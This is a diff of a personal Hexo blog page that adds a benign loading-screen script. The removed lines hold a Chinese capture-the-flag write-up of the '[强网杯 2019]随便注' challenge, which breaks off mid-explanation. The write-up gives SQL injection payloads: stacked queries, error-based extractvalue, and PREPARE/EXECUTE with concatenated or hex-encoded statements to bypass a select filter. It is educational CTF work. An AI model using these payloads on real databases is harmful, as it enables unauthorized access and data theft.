@@ -10,33 +10,17 @@
     <meta name="copyright" content="seora">
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     <meta name="description" content="">
-    <meta name="description" content="[强网杯 2019]随便注 1【SQL注入】本文章中标题为个步骤涉及到的方法。 SQL查询 第一步，先判断注入点的传参方式，发现是get传参。 在输入框，随便输入1&#39; or 1 &#x3D; 1，测试一下是否存在sql注入。 提交后提示error 1064 : You have an error in your SQL syntax; check the manual that correspond">
-<meta property="og:type" content="article">
-<meta property="og:title" content="[强网杯 2019]随便注 1【SQL注入】">
-<meta property="og:url" content="https://everythingis-ok.github.io/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="seora&#39;s blog^^">
+<meta property="og:url" content="https://everythingis-ok.github.io/tags/LangChain4j/index.html">
 <meta property="og:site_name" content="seora&#39;s blog^^">
-<meta property="og:description" content="[强网杯 2019]随便注 1【SQL注入】本文章中标题为个步骤涉及到的方法。 SQL查询 第一步，先判断注入点的传参方式，发现是get传参。 在输入框，随便输入1&#39; or 1 &#x3D; 1，测试一下是否存在sql注入。 提交后提示error 1064 : You have an error in your SQL syntax; check the manual that correspond">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-19_18-28-50.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019183117613.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019184100891.png">
-<meta property="og:image" content="d:\work\notebook\ontebook\CTF\web%E5%AD%A6%E4%B9%A0\sql%E6%B3%A8%E5%85%A5\assets\image-20251019202126770.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019202230281-1760876551147-2.png">
-<meta property="article:published_time" content="2025-10-19T14:01:42.000Z">
-<meta property="article:modified_time" content="2026-05-08T13:11:45.948Z">
 <meta property="article:author" content="seora">
-<meta property="article:tag" content="堆叠注入">
-<meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="报错注入">
-<meta property="article:tag" content="预编译语句">
-<meta property="article:tag" content="更改表名">
-<meta property="article:tag" content="handel语句">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-19_18-28-50.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
-    <title>[强网杯 2019]随便注 1【SQL注入】 · seora&#39;s Studio</title>
+    <title>seora&#39;s Studio</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -203,6 +187,560 @@
     }
 </style>
 
+    
+<script>
+    (function () {
+        var mode = 'light';
+        try {
+            mode = localStorage.getItem('preferredThemeMode') ||
+                (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+        } catch (e) {}
+        document.documentElement.setAttribute('data-preloader', mode === 'dark' ? 'dark' : 'light');
+    })();
+</script>
+<style>
+    /* ========== elegant page preloader ========== */
+    html[data-preloader='dark'] {
+        background-color: #121212;
+    }
+
+    #page-preloader {
+        position: fixed;
+        inset: 0;
+        z-index: 99999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: #ffffff;
+        opacity: 1;
+        visibility: visible;
+        transition: opacity 0.55s cubic-bezier(0.4, 0, 0.2, 1), visibility 0.55s cubic-bezier(0.4, 0, 0.2, 1);
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+
+    html[data-preloader='dark'] #page-preloader {
+        background-color: #121212;
+    }
+
+    #page-preloader.is-leaving {
+        opacity: 0;
+        visibility: hidden;
+    }
+
+    /* top indeterminate progress bar */
+    .pl-progress {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 42%;
+        height: 2px;
+        border-radius: 0 2px 2px 0;
+        background: linear-gradient(90deg, rgba(247, 83, 87, 0), #f75357 55%, rgba(247, 83, 87, 0));
+        filter: progid:DXImageTransform.Microsoft.gradient(enabled='false');
+        box-shadow: 0 0 8px rgba(247, 83, 87, 0.55);
+        animation: pl-slide 1.15s cubic-bezier(0.45, 0, 0.55, 1) infinite;
+    }
+
+    @keyframes pl-slide {
+        0% {
+            transform: translateX(-110%);
+        }
+        100% {
+            transform: translateX(260%);
+        }
+    }
+
+    /* center content */
+    .pl-inner {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        animation: pl-rise 0.6s ease-out both;
+        transition: opacity 0.45s ease, transform 0.45s ease;
+    }
+
+    @keyframes pl-rise {
+        from {
+            opacity: 0;
+            transform: translateY(14px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    #page-preloader.is-leaving .pl-inner {
+        opacity: 0;
+        transform: translateY(-10px) scale(0.98);
+    }
+
+    /* dual-ring spinner */
+    .pl-ring {
+        position: relative;
+        width: 56px;
+        height: 56px;
+        margin-bottom: 1.2rem;
+    }
+
+    .pl-ring::before,
+    .pl-ring::after,
+    .pl-ring i {
+        content: '';
+        position: absolute;
+        border-radius: 50%;
+    }
+
+    .pl-ring::before {
+        inset: 0;
+        border: 2px solid rgba(0, 0, 0, 0.08);
+    }
+
+    html[data-preloader='dark'] .pl-ring::before {
+        border-color: rgba(255, 255, 255, 0.12);
+    }
+
+    .pl-ring::after {
+        inset: 0;
+        border: 2px solid transparent;
+        border-top-color: #f75357;
+        box-shadow: 0 -2px 8px rgba(247, 83, 87, 0.35);
+        animation: pl-spin 0.85s cubic-bezier(0.55, 0.15, 0.45, 0.85) infinite;
+    }
+
+    .pl-ring i {
+        inset: 9px;
+        border: 2px solid transparent;
+        border-bottom-color: rgba(0, 0, 0, 0.18);
+        animation: pl-spin-rev 1.6s linear infinite;
+    }
+
+    html[data-preloader='dark'] .pl-ring i {
+        border-bottom-color: rgba(255, 255, 255, 0.28);
+    }
+
+    @keyframes pl-spin {
+        to {
+            transform: rotate(360deg);
+        }
+    }
+
+    @keyframes pl-spin-rev {
+        to {
+            transform: rotate(-360deg);
+        }
+    }
+
+    /* title & hint */
+    .pl-title {
+        margin: 0 0 0.55rem;
+        font-family: 'Oswald-Regular', -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        font-size: 1.05rem;
+        font-weight: normal;
+        letter-spacing: 0.35em;
+        text-indent: 0.35em;
+        text-transform: uppercase;
+        white-space: nowrap;
+        max-width: 72vw;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        color: #3a3a3a;
+    }
+
+    html[data-preloader='dark'] .pl-title {
+        color: rgba(255, 255, 255, 0.87);
+    }
+
+    .pl-hint {
+        margin: 0;
+        font-size: 0.7rem;
+        letter-spacing: 0.28em;
+        text-indent: 0.28em;
+        color: #b5b5b5;
+    }
+
+    html[data-preloader='dark'] .pl-hint {
+        color: rgba(255, 255, 255, 0.4);
+    }
+
+    .pl-dots {
+        display: inline-block;
+        letter-spacing: 0.08em;
+    }
+
+    .pl-dots i {
+        font-style: normal;
+        opacity: 0.25;
+        animation: pl-blink 1.4s ease-in-out infinite;
+    }
+
+    .pl-dots i:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+
+    .pl-dots i:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+
+    @keyframes pl-blink {
+        0%, 100% {
+            opacity: 0.25;
+        }
+        40% {
+            opacity: 1;
+        }
+    }
+
+    /* ========== category gate ========== */
+    #page-preloader.pl-gate {
+        flex-direction: column;
+        padding: 5vh 16px 84px;
+        overflow-y: auto;
+    }
+
+    .pl-gate-head {
+        text-align: center;
+        margin-bottom: 1.4rem;
+        animation: pl-gate-in 0.5s ease-out both;
+    }
+
+    .pl-gate-eyebrow {
+        margin: 0 0 0.45rem;
+        font-size: 0.68rem;
+        letter-spacing: 0.42em;
+        text-indent: 0.42em;
+        color: #f75357;
+        font-family: 'Oswald-Regular', sans-serif;
+    }
+
+    .pl-gate-title {
+        margin: 0 0 0.5rem;
+        font-family: 'Oswald-Regular', -apple-system, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        font-size: 1.55rem;
+        font-weight: normal;
+        color: #2b2b2b;
+    }
+
+    .pl-gate-sub {
+        margin: 0;
+        font-size: 0.78rem;
+        color: #9a9a9a;
+        letter-spacing: 0.05em;
+    }
+
+    html[data-preloader='dark'] .pl-gate-title {
+        color: rgba(255, 255, 255, 0.92);
+    }
+
+    html[data-preloader='dark'] .pl-gate-sub {
+        color: rgba(255, 255, 255, 0.45);
+    }
+
+    .pl-gate-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(148px, 1fr));
+        gap: 12px;
+        width: min(712px, 100%);
+        max-height: 64vh;
+        overflow-y: auto;
+        padding: 4px;
+        align-content: center;
+    }
+
+    .pl-card {
+        position: relative;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        min-height: 128px;
+        padding: 18px 12px 14px;
+        border: 1px solid rgba(0, 0, 0, 0.09);
+        border-radius: 14px;
+        background-color: rgba(255, 255, 255, 0.6);
+        color: inherit;
+        text-decoration: none;
+        cursor: pointer;
+        transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease, background-color 0.25s ease;
+        animation: pl-gate-in 0.5s ease-out both;
+    }
+
+    html[data-preloader='dark'] .pl-card {
+        border-color: rgba(255, 255, 255, 0.12);
+        background-color: rgba(255, 255, 255, 0.035);
+    }
+
+    .pl-card:nth-child(1) { animation-delay: 0.03s; }
+    .pl-card:nth-child(2) { animation-delay: 0.07s; }
+    .pl-card:nth-child(3) { animation-delay: 0.11s; }
+    .pl-card:nth-child(4) { animation-delay: 0.15s; }
+    .pl-card:nth-child(5) { animation-delay: 0.19s; }
+    .pl-card:nth-child(6) { animation-delay: 0.23s; }
+    .pl-card:nth-child(7) { animation-delay: 0.27s; }
+    .pl-card:nth-child(8) { animation-delay: 0.31s; }
+    .pl-card:nth-child(9) { animation-delay: 0.35s; }
+    .pl-card:nth-child(10) { animation-delay: 0.39s; }
+
+    @keyframes pl-gate-in {
+        from {
+            opacity: 0;
+            transform: translateY(14px) scale(0.98);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+        }
+    }
+
+    .pl-card:hover,
+    .pl-card:focus-visible {
+        outline: none;
+        transform: translateY(-3px);
+        border-color: rgba(247, 83, 87, 0.55);
+        box-shadow: 0 10px 24px -12px rgba(247, 83, 87, 0.45);
+        background-color: #fff;
+    }
+
+    html[data-preloader='dark'] .pl-card:hover,
+    html[data-preloader='dark'] .pl-card:focus-visible {
+        background-color: rgba(255, 255, 255, 0.07);
+    }
+
+    .pl-card-icon {
+        font-size: 1.35rem;
+        margin-bottom: 0.55rem;
+        color: #5a5a5a;
+        transition: color 0.25s ease, transform 0.25s ease;
+    }
+
+    html[data-preloader='dark'] .pl-card-icon {
+        color: rgba(255, 255, 255, 0.75);
+    }
+
+    .pl-card:hover .pl-card-icon {
+        color: #f75357;
+        transform: scale(1.08);
+    }
+
+    .pl-card-name {
+        font-size: 0.92rem;
+        font-weight: 600;
+        color: #2b2b2b;
+        line-height: 1.3;
+    }
+
+    html[data-preloader='dark'] .pl-card-name {
+        color: rgba(255, 255, 255, 0.9);
+    }
+
+    .pl-card-desc {
+        margin-top: 0.3rem;
+        font-size: 0.68rem;
+        color: #9a9a9a;
+        line-height: 1.4;
+    }
+
+    html[data-preloader='dark'] .pl-card-desc {
+        color: rgba(255, 255, 255, 0.42);
+    }
+
+    .pl-card-kids {
+        margin-top: 0.55rem;
+        max-width: 100%;
+        font-size: 0.62rem;
+        color: #b5b5b5;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .pl-card-count {
+        position: absolute;
+        top: 8px;
+        right: 10px;
+        font-size: 0.62rem;
+        color: #bcbcbc;
+    }
+
+    html[data-preloader='dark'] .pl-card-count {
+        color: rgba(255, 255, 255, 0.35);
+    }
+
+    .pl-card-badge {
+        position: absolute;
+        top: -8px;
+        left: -6px;
+        padding: 2px 8px;
+        border-radius: 999px;
+        background: #f75357;
+        color: #fff;
+        font-size: 0.6rem;
+        font-weight: bold;
+        letter-spacing: 0.08em;
+        box-shadow: 0 4px 10px -3px rgba(247, 83, 87, 0.7);
+    }
+
+    .pl-card-accent {
+        border-color: rgba(247, 83, 87, 0.4);
+    }
+
+    .pl-card-accent .pl-card-icon {
+        color: #f75357;
+    }
+
+    .pl-card-repo {
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+        margin-top: 0.55rem;
+        padding: 2px 10px;
+        border: 1px solid rgba(247, 83, 87, 0.45);
+        border-radius: 999px;
+        font-size: 0.66rem;
+        color: #f75357;
+        transition: background-color 0.2s ease, color 0.2s ease;
+    }
+
+    .pl-card-repo:hover {
+        background: #f75357;
+        color: #fff;
+    }
+
+    .pl-card-lucky {
+        border-style: dashed;
+        background: transparent;
+        font-family: inherit;
+    }
+
+    .pl-card-lucky .pl-card-icon {
+        color: #b0b0b0;
+    }
+
+    .pl-card-lucky:hover .pl-card-icon {
+        color: #f75357;
+    }
+
+    /* countdown skip ring */
+    .pl-skip {
+        position: fixed;
+        right: 26px;
+        bottom: 22px;
+        display: block;
+        padding: 0;
+        border: 0;
+        background: none;
+        cursor: pointer;
+        color: #8a8a8a;
+        z-index: 1;
+        animation: pl-gate-in 0.5s 0.4s ease-out both;
+    }
+
+    html[data-preloader='dark'] .pl-skip {
+        color: rgba(255, 255, 255, 0.6);
+    }
+
+    .pl-skip-svg {
+        display: block;
+        width: 52px;
+        height: 52px;
+    }
+
+    .pl-skip-track {
+        fill: none;
+        stroke: rgba(0, 0, 0, 0.08);
+        stroke-width: 2.5;
+    }
+
+    html[data-preloader='dark'] .pl-skip-track {
+        stroke: rgba(255, 255, 255, 0.14);
+    }
+
+    .pl-skip-bar {
+        fill: none;
+        stroke: #f75357;
+        stroke-width: 2.5;
+        stroke-linecap: round;
+        stroke-dasharray: 100;
+        stroke-dashoffset: 0;
+        transform-box: fill-box;
+        transform-origin: center;
+        transform: rotate(-90deg);
+    }
+
+    .pl-skip-num {
+        fill: currentColor;
+        font-family: 'Oswald-Regular', sans-serif;
+        font-size: 16px;
+    }
+
+    .pl-skip-label {
+        display: block;
+        margin-top: 2px;
+        font-size: 0.6rem;
+        letter-spacing: 0.12em;
+        color: #b0b0b0;
+    }
+
+    html[data-preloader='dark'] .pl-skip-label {
+        color: rgba(255, 255, 255, 0.4);
+    }
+
+    .pl-skip:hover .pl-skip-bar {
+        stroke-width: 3.2;
+    }
+
+    #page-preloader.is-paused .pl-skip-bar {
+        opacity: 0.45;
+    }
+
+    @media (max-width: 600px) {
+        #page-preloader.pl-gate {
+            padding: 3.5vh 12px 76px;
+        }
+        .pl-gate-title {
+            font-size: 1.25rem;
+        }
+        .pl-gate-grid {
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+        .pl-card {
+            min-height: 112px;
+            padding: 14px 8px 12px;
+        }
+        .pl-card-kids {
+            display: none;
+        }
+        .pl-skip {
+            right: 14px;
+            bottom: 12px;
+        }
+        .pl-skip-label {
+            display: none;
+        }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+        .pl-progress,
+        .pl-inner,
+        .pl-ring::after,
+        .pl-ring i,
+        .pl-dots i,
+        .pl-gate-head,
+        .pl-card,
+        .pl-skip {
+            animation: none !important;
+        }
+        #page-preloader,
+        .pl-inner,
+        .pl-card {
+            transition: opacity 0.2s linear;
+        }
+    }
+</style>
+
     <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
@@ -225,7 +763,60 @@
             document.write('<script src="/lib/jquery.min.js" />')
         }
     </script>
-        <body class="post-body">
+        <!-- elegant page preloader -->
+        
+
+<div id="page-preloader" role="status" aria-live="polite" aria-label="Loading">
+    <div class="pl-progress"></div>
+    <div class="pl-inner">
+        <div class="pl-ring"><i></i></div>
+        <p class="pl-title">seora&#39;s Studio</p>
+        <p class="pl-hint">LOADING<span class="pl-dots"><i>.</i><i>.</i><i>.</i></span></p>
+    </div>
+</div>
+<script>
+    (function () {
+        var el = document.getElementById('page-preloader');
+        if (!el) return;
+
+        var start = Date.now();
+        var done = false;
+        // minimum visible time to avoid flicker on very fast loads
+        var MIN_VISIBLE = 350;
+        // hard fallback in case window 'load' never fires (blocked trackers, etc.)
+        var MAX_VISIBLE = 4500;
+
+        function leave() {
+            if (done) return;
+            done = true;
+            var wait = Math.max(0, MIN_VISIBLE - (Date.now() - start));
+            setTimeout(function () {
+                el.classList.add('is-leaving');
+                setTimeout(function () {
+                    if (el.parentNode) el.parentNode.removeChild(el);
+                }, 600);
+            }, wait);
+        }
+
+        if (document.readyState === 'complete') {
+            leave();
+        } else {
+            window.addEventListener('load', function () {
+                setTimeout(leave, 120);
+            });
+        }
+
+        // bfcache restore
+        window.addEventListener('pageshow', function (e) {
+            if (e.persisted) leave();
+        });
+
+        // safety cap
+        setTimeout(leave, MAX_VISIBLE);
+    })();
+</script>
+
+
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -255,7 +846,7 @@
             <a href="/">seora&#39;s Studio.</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name">[强网杯 2019]随便注 1【SQL注入】</a>
+            <a href="#" class="post-name"></a>
         </div>
     </div>
 </header>
@@ -263,31 +854,6 @@
         <!-- fixed footer -->
         <footer class="footer-fixed">
     <!-- donate button -->
-    <div class="donate-popup donate-popup--hidden">
-    <div class="donate-popup__title">Buy Me A Coffee</div>
-    <div class="donate-popup__content">
-        <div class="donate-popup__content-description">If this post helped you, please consider buying the author a cup of sugar-free coffee ☕️.</div>
-        <img
-            class="donate-popup__content-qrCode"
-            title="Wechat"
-            alt="Wechat"
-            src="/source/images/donate-wechat.png"
-        ></img>
-        <img
-            class="donate-popup__content-qrCode"
-            title="Alipay"
-            alt="Alipay"
-            src="/source/images/donate-alipay.png"
-        ></img>
-    </div>
-</div>
-
-    <div
-        title="Donate to the author"
-        class="footer-fixed-btn footer-fixed-btn--hidden donate-btn"
-    >
-        <i class="fas fa-donate"></i>
-    </div>
 
     <!-- back to top button -->
     <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
@@ -297,65 +863,20 @@
 
         <!-- wrapper -->
         <div class="wrapper">
-            <div class="site-intro" style="    height:50vh;
-">
+            <div class="site-intro" style="">
     <!-- 主页  -->
-    <!-- 404页  -->
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-                [强网杯 2019]随便注 1【SQL注入】
-            <!-- 404 -->
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
-            <!-- 404 -->
         </p>
         <!-- 文章页 meta -->
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                    <div class="post-intro-tags" >
-        <a class="post-tag" href="javascript:void(0);" data-tags="堆叠注入">堆叠注入</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="SQL注入">SQL注入</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="报错注入">报错注入</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="预编译语句">预编译语句</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="更改表名">更改表名</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="handel语句">handel语句</a>
-</div>
-
-                <!-- 文章字数统计 -->
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
-                    </div>
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2025/10/19</span>
-                    <!-- busuanzi -->
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
     </div>
 </div>
 
@@ -482,109 +1003,41 @@
   )
 </script>
 
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
             <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <h1 id="强网杯-2019-随便注-1【SQL注入】"><a href="#强网杯-2019-随便注-1【SQL注入】" class="headerlink" title="[强网杯 2019]随便注 1【SQL注入】"></a>[强网杯 2019]随便注 1【SQL注入】</h1><p>本文章中标题为个步骤涉及到的方法。</p>
-<h3 id="SQL查询"><a href="#SQL查询" class="headerlink" title="SQL查询"></a>SQL查询</h3><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-19_18-28-50.png" alt="PixPin_2025-10-19_18-28-50"></p>
-<p>第一步，先判断注入点的传参方式，发现是get传参。</p>
-<p>在输入框，随便输入<code>1&#39; or 1 = 1</code>，测试一下是否存在sql注入。</p>
-<p>提交后提示<code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;&#39; at line 1</code>，说明后端参数后面有可能存在其他sql语句，我们在1’ or 1 &#x3D; 1后面加一个#，将可能存在的其他sql语句注释掉，即：<code>1&#39; or 1 = 1#</code>，成功输出了该表的所有数据，但是没有flag。</p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019183117613.png" alt="image-20251019183117613"></p>
-<p>首先判断一下字段个数：<code>-1&#39; union select 1,2;#</code>，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019184100891.png" alt="image-20251019184100891"></p>
-<p>可以看到系统把select等关键词都过滤了，我们可以使用堆叠注入的方式来绕过select关键字。</p>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单介绍一下堆叠注入，<strong>堆叠注入（Stacked Query Injection）</strong>是一种 SQL 注入攻击技术，攻击者通过注入多个 SQL 语句到一个查询中，利用数据库支持堆叠查询的特性（即在同一条查询中执行多个 SQL 语句）来执行恶意操作。这类攻击利用了某些数据库管理系统（DBMS）允许多个 SQL 语句在一个查询中堆叠执行的特性，通常通过分号（;）分隔不同的 SQL 语句。</p>
-<p>查看数据库名：<code>1&#39;;show databases;#</code></p>
-<p><img src="D:\work\notebook\ontebook\CTF\web学习\sql注入\assets\image-20251019202126770.png" alt="image-20251019202126770"></p>
-<p>查看数据表：<code>1&#39;;show tables;#</code></p>
-<p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251019202230281-1760876551147-2.png" alt="image-20251019202230281"></p>
-<p>查看表结构</p>
-<p>注意：<strong>tableName如果是纯数字，需要用&#96;包裹</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;; show columns from `1919810931114514`;#</span><br><span class="line"></span><br><span class="line">1&#x27;;desc `1919810931114514`;#</span><br></pre></td></tr></table></figure>
-
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里是中插一种思路，因为在报错注入查询 数据库名字的时候是不用select的，所以在这里我们是可以用的：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (extractvalue(1,concat(0x7e,database(),0x7e)))-- q</span></span><br></pre></td></tr></table></figure>
-
-<p>但是只能用于查询表明，数据库名，查询字段时不能用这种方法。</p>
-<h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>先解释一下什么是预编译语句，</p>
-<p>通俗版一点，就是把 SQL 先给数据库“过一遍语法与优化器”，得到可执行的<strong>执行计划</strong>，然后多次执行时就<strong>复用计划</strong>，只换参数，不必每次重新解析与优化。</p>
-<p>格式：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> 名称 <span class="keyword">FROM</span> 	<span class="keyword">Sql</span>语句 ? ;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@x</span><span class="operator">=</span>xx;</span><br><span class="line"><span class="keyword">EXECUTE</span> 名称 <span class="keyword">USING</span> <span class="variable">@x</span>;</span><br></pre></td></tr></table></figure>
-
-<p>例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line"><span class="keyword">SElECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t_user <span class="keyword">WHERE</span> USER_ID <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">#这是普通的<span class="keyword">sql</span>查询语句</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line"><span class="keyword">PREPARE</span> jia <span class="keyword">FROM</span> <span class="string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;</span><br><span class="line">#将预编译语句命名为jia 要执行的语句是<span class="keyword">SElECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t_user <span class="keyword">WHERE</span> USER_ID <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">EXECUTE</span> jia;</span><br><span class="line">#表示要执行jia</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line"><span class="keyword">PREPARE</span> jia <span class="keyword">FROM</span> <span class="string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@ID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">#这里表示要查询的ID值为<span class="number">1</span></span><br><span class="line"><span class="keyword">EXECUTE</span> jia <span class="keyword">USING</span> <span class="variable">@ID</span>;</span><br><span class="line">#对jia语句进行了填充替换然后执行</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@SQL</span><span class="operator">=</span><span class="string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;</span><br><span class="line"><span class="keyword">PREPARE</span> jia <span class="keyword">FROM</span> <span class="variable">@SQL</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> jia;</span><br></pre></td></tr></table></figure>
-
-<p>因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from </code>1919810931114514<code> &#39;);EXECUTE hacker;#</code>得flag。</p>
-<h3 id="预编译语句-将语句进行16进制编码"><a href="#预编译语句-将语句进行16进制编码" class="headerlink" title="预编译语句 将语句进行16进制编码"></a>预编译语句 将语句进行16进制编码</h3><p>可以直接将<code>select * from </code>1919810931114514&#96;&#96;语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>，替换payload：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="更改表名"><a href="#更改表名" class="headerlink" title="更改表名"></a>更改表名</h3><p>最后一步也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：</p>
